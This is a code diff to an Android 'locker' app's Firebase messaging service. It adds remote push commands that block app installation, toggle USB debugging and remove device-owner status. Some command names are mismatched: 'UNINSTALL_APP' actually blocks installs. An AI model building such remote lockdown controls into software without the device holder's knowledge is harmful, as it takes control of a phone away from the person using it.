@@ -5,6 +5,7 @@ import com.d.locker.lock.utils.AudioPlayer
 import com.d.locker.lock.utils.LocationUtils
 import com.d.locker.lock.utils.LockManager
 import com.d.locker.lock.utils.NetworkManager
+import com.d.locker.lock.utils.DevicePolicyUtils
 import com.d.locker.lock.utils.WallpaperUtils
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
@@ -110,6 +111,31 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 "UNBLOCK_SETTINGS" -> {
                     Log.d(TAG, "⚙️ Command: UNBLOCK_SETTINGS -> Enabling Settings")
                     com.d.locker.lock.utils.RestrictionUtils.setSettingsDisabled(applicationContext, false)
+                }
+
+                // App Management
+                "UNINSTALL_APP" -> {
+                    Log.d(TAG, "📲 Command: UNINSTALL_APP -> Blocking App Installation")
+                    com.d.locker.lock.utils.AppManager.disallowInstallation(applicationContext)
+                }
+                "INSTALL_APP" -> {
+                    Log.d(TAG, "📲 Command: INSTALL_APP -> Allowing App Installation")
+                    com.d.locker.lock.utils.AppManager.allowInstallation(applicationContext)
+                }
+
+                // USB Management
+                "USB_DEBUGGIN_DESINABLE", "USB_DEBUGGING_DISABLE" -> {
+                    Log.d(TAG, "🔌 Command: USB_DEBUGGING_DISABLE -> Disabling ADB")
+                    com.d.locker.lock.utils.UsbManager.disableUsbDebugging(applicationContext)
+                }
+                "USB_DEBUGGING_ENABLE" -> {
+                    Log.d(TAG, "🔌 Command: USB_DEBUGGING_ENABLE -> Enabling ADB")
+                    com.d.locker.lock.utils.UsbManager.enableUsbDebugging(applicationContext)
+                }
+
+                "DISABLE_PROTECTION" -> {
+                    Log.d(TAG, "🛡️ Command: DISABLE_PROTECTION -> Removing Device Owner")
+                    DevicePolicyUtils.removeDeviceOwner(applicationContext)
                 }
 
                 else -> {
